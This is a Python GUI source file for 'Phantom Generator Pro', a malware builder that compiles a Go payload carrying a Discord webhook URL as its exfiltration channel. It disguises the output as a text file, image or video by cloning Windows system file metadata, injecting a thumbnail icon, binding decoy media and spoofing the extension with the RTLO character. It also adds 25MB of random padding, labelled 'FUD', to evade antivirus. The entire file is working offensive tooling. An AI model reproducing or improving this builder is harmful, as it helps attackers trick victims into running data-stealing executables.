import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import os
import subprocess
import sys

def install_dependencies():
    """Checks and installs required python modules"""
    required = ['opencv-python', 'Pillow']
    for package in required:
        try:
            if package == 'opencv-python':
                import cv2
            elif package == 'Pillow':
                from PIL import Image
        except ImportError:
            print(f"Installing missing dependency: {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Auto-install dependencies before imports
install_dependencies()

import cv2
from PIL import Image
from resource_injector import inject_icon, clone_resources

class Phantom:
    def __init__(self, root):
        self.root = root
        self.root.title("Phantom Generator Pro")
        self.root.geometry("600x650")
        self.root.configure(bg="#1a1a1a")
        self.root.resizable(True, True)
        
        # Style
        style = ttk.Style()
        style.theme_use('clam')
        
        # Colors
        BG_COLOR = "#1a1a1a"
        ACCENT_COLOR = "#3498db"
        TEXT_COLOR = "#ecf0f1"
        SECONDARY_BG = "#2c3e50"

        style.configure("TFrame", background=BG_COLOR)
        style.configure("TLabel", background=BG_COLOR, foreground=TEXT_COLOR, font=("Segoe UI", 10))
        style.configure("TButton", font=("Segoe UI", 10, "bold"))
        style.configure("Header.TLabel", font=("Segoe UI", 20, "bold"), foreground=ACCENT_COLOR)
        style.configure("Status.TLabel", font=("Segoe UI", 9, "italic"), foreground="#95a5a6")
        style.configure("Horizontal.TProgressbar", thickness=10)

        # Initialize attributes
        self.destination = None
        self.icon_path = None
        self.media_path = None
        self.go_executable = self._find_go_executable()

        # Main Container
        main_frame = ttk.Frame(root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Header
        header = ttk.Label(main_frame, text="PHANTOM GENERATOR V2", style="Header.TLabel")
        header.pack(pady=(0, 15))

        # Webhook URL
        ttk.Label(main_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
        self.url_entry = ttk.Entry(main_frame, width=60)
        self.url_entry.pack(fill=tk.X, pady=(5, 10))

        # EXE Name
        ttk.Label(main_frame, text="Output EXE Name:").pack(anchor=tk.W)
        self.exe_entry = ttk.Entry(main_frame, width=60)
        self.exe_entry.insert(0, "phantom_payload.exe")
        self.exe_entry.pack(fill=tk.X, pady=(5, 10))

        # Mode Selection Frame
        mode_frame = ttk.LabelFrame(main_frame, text="🎭 Payload Mode", padding=10)
        mode_frame.pack(fill=tk.X, pady=(0, 10))

        self.mode_var = tk.StringVar(value="None")
        
        # Grid layout for modes
        ttk.Radiobutton(mode_frame, text="Normal EXE", variable=self.mode_var, value="None", command=self.update_media_button).grid(row=0, column=0, sticky=tk.W, padx=5)
        ttk.Radiobutton(mode_frame, text="Notepad (.txt)", variable=self.mode_var, value="Notepad", command=self.update_media_button).grid(row=0, column=1, sticky=tk.W, padx=5)
        ttk.Radiobutton(mode_frame, text="Image (.png)", variable=self.mode_var, value="Image", command=self.update_media_button).grid(row=1, column=0, sticky=tk.W, padx=5)
        ttk.Radiobutton(mode_frame, text="Video (.mp4)", variable=self.mode_var, value="Video", command=self.update_media_button).grid(row=1, column=1, sticky=tk.W, padx=5)

        # Camouflage Options Frame
        camo_frame = ttk.LabelFrame(main_frame, text="🛡️ Stealth Options", padding=10)
        camo_frame.pack(fill=tk.X, pady=(0, 10))

        self.rtlo_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(camo_frame, text="RTLO Spoofing (Extension)", variable=self.rtlo_var).grid(row=0, column=0, sticky=tk.W, padx=5)

        self.fud_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(camo_frame, text="FUD (Padding 25MB)", variable=self.fud_var).grid(row=0, column=1, sticky=tk.W, padx=5)

        # Buttons Frame
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=10)

        self.destination_button = ttk.Button(btn_frame, text="📁 Destination", command=self.select_destination)
        self.destination_button.pack(side=tk.LEFT, padx=(0, 5), expand=True, fill=tk.X)

        self.icon_button = ttk.Button(btn_frame, text="🖼️ Icon", command=self.select_icon)
        self.icon_button.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)

        self.media_button = ttk.Button(btn_frame, text="🎬 Select Media", command=self.select_media, state=tk.DISABLED)
        self.media_button.pack(side=tk.LEFT, padx=(5, 0), expand=True, fill=tk.X)

        # Status Labels
        info_frame = ttk.Frame(main_frame)
        info_frame.pack(fill=tk.X, pady=5)

        self.dest_label = ttk.Label(info_frame, text="📍 No folder selected", font=("Segoe UI", 8), foreground="#bdc3c7")
        self.dest_label.pack(anchor=tk.W)
        
        self.icon_label = ttk.Label(info_frame, text="🖼️ No icon selected", font=("Segoe UI", 8), foreground="#bdc3c7")
        self.icon_label.pack(anchor=tk.W)

        self.media_label = ttk.Label(info_frame, text="🎬 No media binded", font=("Segoe UI", 8), foreground="#bdc3c7")
        self.media_label.pack(anchor=tk.W)

        # Generate Button
        self.generate_button = ttk.Button(main_frame, text="⚡ GENERATE PHANTOM PAYLOAD", command=self.generate_malware)
        self.generate_button.pack(fill=tk.X, pady=(15, 10))

        # Progress
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(main_frame, variable=self.progress_var, maximum=100, style="Horizontal.TProgressbar")
        self.progress_bar.pack(fill=tk.X, pady=(10, 5))
        
        self.status_label = ttk.Label(main_frame, text="Ready", style="Status.TLabel")
        self.status_label.pack()
    
    def _find_go_executable(self):
        """Find the Go executable in the system"""
        # 1. Try common locations
        possible_paths = [
            os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "Go", "bin", "go.exe"),
            "C:\\go\\bin\\go.exe",
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        
        # 2. Try from PATH using 'where' or 'which'
        try:
            cmd = "where" if os.name == "nt" else "which"
            result = subprocess.run([cmd, "go"], capture_output=True, text=True, check=True)
            return result.stdout.strip().split('\n')[0]
        except:
            return None

    def select_destination(self):
        self.destination = filedialog.askdirectory()
        if self.destination:
            self.dest_label.config(text=f"📍 {os.path.abspath(self.destination)}")

    def select_icon(self):
        self.icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if self.icon_path:
            self.icon_label.config(text=f"🖼️ {os.path.basename(self.icon_path)}")

    def select_media(self):
        mode = self.mode_var.get()
        filetypes = []
        if mode == "Image":
            filetypes = [("Image files", "*.png *.jpg *.jpeg *.bmp")]
        elif mode == "Video":
            filetypes = [("Video files", "*.mp4 *.avi *.mkv *.mov")]
        
        self.media_path = filedialog.askopenfilename(filetypes=filetypes)
        if self.media_path:
            self.media_label.config(text=f"🎬 {os.path.basename(self.media_path)}")

    def update_media_button(self):
        mode = self.mode_var.get()
        if mode in ["Image", "Video"]:
            self.media_button.config(state=tk.NORMAL)
        else:
            self.media_button.config(state=tk.DISABLED)
            self.media_path = None
            self.media_label.config(text="🎬 No media binded")

    def generate_thumbnail_icon(self, media_path, output_ico):
        """Generates a high-quality .ico from an image or video frame"""
        try:
            mode = self.mode_var.get()
            img = None

            if mode == "Image":
                img = Image.open(media_path)
            elif mode == "Video":
                cap = cv2.VideoCapture(media_path)
                # Skip first few frames to avoid black screen at start
                for _ in range(5):
                    cap.grab()
                success, frame = cap.retrieve()
                if not success: # Fallback to first frame if grab fails
                    cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
                    success, frame = cap.read()
                
                if success:
                    # Convert BGR to RGB
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img = Image.fromarray(frame_rgb)
                cap.release()

            if img:
                # Standard icon sizes for Windows
                sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
                img.save(output_ico, format='ICO', sizes=sizes)
                return True
        except Exception as e:
            print(f"Error generating thumbnail icon: {e}")
        return False

    def generate_malware(self):
        url = self.url_entry.get().strip()
        exe_name = self.exe_entry.get().strip()
        
        if not url:
            messagebox.showwarning("Warning", "Please enter a Webhook URL")
            return
        
        # Validate Webhook URL format
        if not url.startswith("https://discord.com/api/webhooks/") and not url.startswith("https://discordapp.com/api/webhooks/"):
            messagebox.showwarning("Warning", "Invalid Webhook URL. It should start with https://discord.com/api/webhooks/")
            return

        if not self.destination:
            messagebox.showwarning("Warning", "Please select a destination folder")
            return
        
        if not self.go_executable:
            messagebox.showerror("Error", "Go (Golang) not found on your system.\nPlease install it from https://go.dev/")
            return
        
        if not exe_name.endswith('.exe'):
            exe_name += '.exe'
        
        try:
            self.generate_button.config(state=tk.DISABLED)
            self.status_label.config(text="Initializing...")
            self.progress_var.set(5)
            self.root.update()
            
            script_dir = os.path.dirname(os.path.abspath(__file__))
            go_payload_dir = os.path.join(script_dir, "go_payload")
            output_exe = os.path.join(self.destination, exe_name)
            
            if not os.path.exists(os.path.join(go_payload_dir, "main.go")):
                messagebox.showerror("Error", "Source files missing in 'go_payload' directory")
                return
            
            self.status_label.config(text="Preparing build environment...")
            self.progress_var.set(20)
            self.root.update()
            
            # Compile Go code
            timestamp = str(__import__('datetime').datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            
            # Prepare BindedFile name
            binded_file_name = ""
            if self.media_path:
                binded_file_name = os.path.basename(self.media_path)
            
            # ldflags: -s -w (reduce size), -H=windowsgui (no console window)
            ldflags = f"-s -w -H=windowsgui -X \"main.WebhookURL={url}\" -X \"main.Timestamp={timestamp}\" -X \"main.BindedFile={binded_file_name}\""
            
            self.status_label.config(text="Compiling binary (Go)...")
            self.progress_var.set(40)
            self.root.update()

            build_cmd = [
                self.go_executable, "build",
                "-o", output_exe,
                "-ldflags", ldflags,
                "main.go"
            ]
            
            result = subprocess.run(build_cmd, check=True, cwd=go_payload_dir, 
                                 capture_output=True, text=True)
            
            # Inject icon & Metadata
            target_file_for_meta = None
            camo_mode = self.mode_var.get()
            
            if camo_mode == "Notepad":
                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "notepad.exe")
            elif camo_mode == "Image":
                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "imageres.dll")
            elif camo_mode == "Video":
                # For video, we can use Windows Media Player or similar for metadata
                target_file_for_meta = os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "Windows Media Player", "wmplayer.exe")
                if not os.path.exists(target_file_for_meta):
                    target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "shell32.dll")

            # Priority 1: User selected icon
            # Priority 2: Auto-generate icon from media (thumbnail)
            final_icon = self.icon_path
            temp_icon_path = None

            if not final_icon and self.media_path and camo_mode in ["Image", "Video"]:
                self.status_label.config(text="Generating thumbnail icon...")
                temp_icon_path = os.path.join(self.destination, "temp_thumb.ico")
                if self.generate_thumbnail_icon(self.media_path, temp_icon_path):
                    final_icon = temp_icon_path

            # 1. First, clone metadata if a target is available
            if target_file_for_meta and os.path.exists(target_file_for_meta):
                self.status_label.config(text="Cloning metadata...")
                self.progress_var.set(70)
                self.root.update()
                try:
                    # Clone everything (including icons) from the target first
                    clone_resources(target_file_for_meta, output_exe)
                except Exception as e:
                    print(f"Warning: Metadata cloning failed: {e}")
            
            # 2. Then, inject our specific icon (this overwrites any icon from cloning)
            if final_icon and os.path.exists(final_icon):
                self.status_label.config(text="Injecting final icon...")
                success = inject_icon(output_exe, final_icon)
                if not success:
                    print("Failed to inject icon!")
                    self.status_label.config(text="Icon injection failed!")
            
            # Clean up temp icon
            if temp_icon_path and os.path.exists(temp_icon_path):
                try:
                    os.remove(temp_icon_path)
                except:
                    pass

            # Bind the media file (Must be done AFTER resource injection, otherwise it gets stripped)
            if self.media_path and os.path.exists(self.media_path):
                self.status_label.config(text="Binding media file...")
                with open(self.media_path, "rb") as f_media:
                    media_data = f_media.read()
                
                with open(output_exe, "ab") as f_exe:
                    f_exe.write(b"PHANTOM_BIND_MARKER")
                    f_exe.write(media_data)
            
            # FUD Optimization (Padding)
            if self.fud_var.get():
                self.status_label.config(text="Applying FUD optimizations...")
                self.progress_var.set(80)
                self.root.update()
                try:
                    with open(output_exe, "ab") as f:
                        f.write(os.urandom(25 * 1024 * 1024)) # Add 25MB padding
                except:
                    pass

            # RTLO Extension Spoofing
            final_path = output_exe
            if self.rtlo_var.get():
                self.status_label.config(text="Applying RTLO spoofing...")
                dir_name = os.path.dirname(output_exe)
                base_name = os.path.basename(output_exe).replace(".exe", "")
                
                # RTLO character (U+202E) reverses the following text
                rtlo = "\u202e"
                
                if camo_mode == "Notepad":
                    spoofed_name = f"{base_name}{rtlo}txt.exe"
                elif camo_mode == "Image":
                    spoofed_name = f"{base_name}{rtlo}gnp.exe"
                elif camo_mode == "Video":
                    spoofed_name = f"{base_name}{rtlo}4pm.exe" # 4pm -> mp4
                else:
                    spoofed_name = f"{base_name}{rtlo}gpj.exe"
                
                final_path = os.path.join(dir_name, spoofed_name)
                try:
                    if os.path.exists(final_path):
                        os.remove(final_path)
                    os.rename(output_exe, final_path)
                except Exception as e:
                    print(f"RTLO Rename failed: {e}")

            self.status_label.config(text="Payload ready!")
            self.progress_var.set(100)
            self.root.update()
            
            messagebox.showinfo("Success", f"Payload generated successfully!\n\nLocation: {final_path}")
            
        except subprocess.CalledProcessError as e:
            error_msg = e.stderr if e.stderr else str(e)
            messagebox.showerror("Build Error", f"Compilation failed:\n{error_msg}")
        except Exception as e:
            messagebox.showerror("Error", f"An unexpected error occurred:\n{str(e)}")
        finally:
            self.generate_button.config(state=tk.NORMAL)
            self.status_label.config(text="Ready")
            self.progress_var.set(0)

if __name__ == "__main__":
    root = tk.Tk()
    app = Phantom(root)
    root.mainloop()
